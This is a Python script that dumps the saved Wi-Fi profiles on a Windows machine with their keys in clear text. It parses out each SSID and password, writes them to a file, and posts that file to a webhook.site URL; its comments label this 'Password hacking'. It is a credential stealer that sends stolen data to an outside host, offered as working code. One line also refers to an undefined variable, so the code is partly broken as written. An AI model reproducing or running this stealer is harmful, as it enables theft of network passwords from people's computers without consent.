import subprocess #Use python to execute a Windows command
import os
import sys
import requests

#Unique URL - can be used from webhook.site
url = 'https://webhook.site/83c68b62-b86d-431a-bf2e-58d5ba83110b'


#Create a password file
password_file = open('passwords.txt',"w")
password_file.write("Your Passwords:\n\n")
password_file.close()

#lists
wi5_files=[]
wi5_name = []
wi5_pswd = []

#Windows command execution
command = subprocess.run(["netsh","wlan","export","profile","key=clear"], capture_output = True).stdout.decode()

#Current directory
path = os.getcwd()

#Password hacking
for i in os.listdir(path):
	if i.startswith("Wi-Fi") and i.endswith(".xml"):
		wi5_files.append(i)
		for j in wi5_files:
			with open(j,'r') as f:
				for line in f.readlines():
					if 'name' in line: #in the xml file <name> xyz </name> -> xyz is the wifi name
						stripped = line.strip()
						front = stripped[6:]
						back = front[:-7]
						if back not in wi5_name:
							wi5_name.append(back)
					
					if 'keyMaterial' in line: # similarly <keyMaterial> abc </keyMaterial> -> abc is the wifi password
						stripped = line.strip()
						front = stripped[13:]
						back = front[:-14]
						if back not in wi5_:
							wi5_pswd.append(back)
				
print(wi5_files)
print(wi5_name)
print(wi5_pswd)
for x,y in zip(wi5_name, wi5_pswd):
	sys.stdout = open("passwords.txt", "a")
	print("SSID: "+x, "Password: "+y, sep='\n')
	sys.stdout.close()
						
#Execution
with open('passwords.txt','rb') as f:
	r = requests.post(url, data = f)

